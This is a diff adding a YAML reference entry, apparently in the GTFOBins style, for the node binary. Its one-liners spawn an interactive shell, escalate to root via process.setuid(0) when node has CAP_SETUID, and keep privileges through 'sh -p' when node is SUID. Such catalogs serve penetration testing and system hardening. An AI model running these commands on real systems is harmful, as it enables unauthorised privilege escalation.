@@ -1,0 +1,17 @@
+---
+functions:
+  shell:
+  - code: |-
+      node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
+    contexts:
+      capabilities:
+        code: |-
+          node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
+        list:
+        - CAP_SETUID
+      sudo:
+      suid:
+        code: |-
+          node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
+      unprivileged:
+...
